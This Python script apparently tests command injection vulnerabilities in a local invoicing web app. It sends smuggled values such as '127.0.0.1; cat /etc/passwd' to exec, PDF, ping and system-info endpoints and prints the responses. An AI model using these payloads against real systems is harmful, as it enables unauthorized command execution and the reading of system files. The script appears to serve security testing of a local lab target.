#!/usr/bin/env python3
import requests
import urllib.parse
import time

# Configuration
BASE_URL = "http://localhost:3001"  # Local development server
TIMEOUT = 5  # seconds

def test_simple_command_injection():
    """Test simple command injection using exec"""
    print("\n[+] Testing Simple Command Injection")
    endpoint = f"{BASE_URL}/api/system/exec"
    
    # Test basic command
    command = "whoami"
    r = requests.get(endpoint, params={"command": command}, timeout=TIMEOUT)
    print(f"[*] Testing basic command: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")

    # Test command injection
    command = "whoami; cat /etc/passwd"
    r = requests.get(endpoint, params={"command": command}, timeout=TIMEOUT)
    print(f"\n[*] Testing command injection: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")

def test_pdf_command_injection():
    """Test command injection in PDF generation"""
    print("\n[+] Testing PDF Command Injection")
    endpoint = f"{BASE_URL}/api/system/pdf"
    
    # Test basic PDF generation
    params = {
        "template": "template.html",
        "output": "output.pdf"
    }
    r = requests.get(endpoint, params=params, timeout=TIMEOUT)
    print(f"[*] Testing basic PDF generation")
    print(f"[*] Status: {r.status_code}")

    # Test command injection
    params = {
        "template": "template.html; cat /etc/passwd",
        "output": "output.pdf"
    }
    r = requests.get(endpoint, params=params, timeout=TIMEOUT)
    print(f"\n[*] Testing command injection in template")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.text}")

def test_ping_command_injection():
    """Test command injection in ping command"""
    print("\n[+] Testing Ping Command Injection")
    endpoint = f"{BASE_URL}/api/system/ping"
    
    # Test basic ping
    r = requests.get(endpoint, params={"host": "127.0.0.1"}, timeout=TIMEOUT)
    print(f"[*] Testing basic ping")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")

    # Test command injection
    command = "127.0.0.1; cat /etc/passwd"
    r = requests.get(endpoint, params={"host": command}, timeout=TIMEOUT)
    print(f"\n[*] Testing command injection: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")

def test_system_info_injection():
    """Test command injection in system info"""
    print("\n[+] Testing System Info Command Injection")
    endpoint = f"{BASE_URL}/api/system/info"
    
    # Test basic system info
    r = requests.get(endpoint, params={"type": "cpu"}, timeout=TIMEOUT)
    print(f"[*] Testing basic system info")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'][:200].strip()}")

    # Test command injection
    command = "cpu; cat /etc/passwd"
    r = requests.get(endpoint, params={"type": command}, timeout=TIMEOUT)
    print(f"\n[*] Testing command injection: {command}")
    print(f"[*] Status: {r.status_code}")
    if r.status_code == 200:
        print(f"[*] Output:\n{r.json()['output'].strip()}")

def main():
    print("[+] Command Injection Vulnerability Tests")
    print("[+] Target: Fusion.js Invoicer App")
    
    try:
        # Test basic connectivity
        r = requests.get(f"{BASE_URL}/api/system/exec", params={"command": "whoami"}, timeout=TIMEOUT)
        if r.status_code != 200:
            print(f"[-] Error: Application returned status {r.status_code}")
            return
        
        # Run tests one by one
        test_simple_command_injection()
        print("\n[*] Press Enter to continue with PDF injection test...")
        input()
        test_pdf_command_injection()
        print("\n[*] Press Enter to continue with ping injection test...")
        input()
        test_ping_command_injection()
        print("\n[*] Press Enter to continue with system info injection test...")
        input()
        test_system_info_injection()
        
    except requests.exceptions.Timeout:
        print("[-] Error: Request timed out")
    except requests.exceptions.RequestException as e:
        print(f"[-] Error connecting to application: {e}")
    except KeyboardInterrupt:
        print("\n[-] Test interrupted by user")

if __name__ == "__main__":
    main() 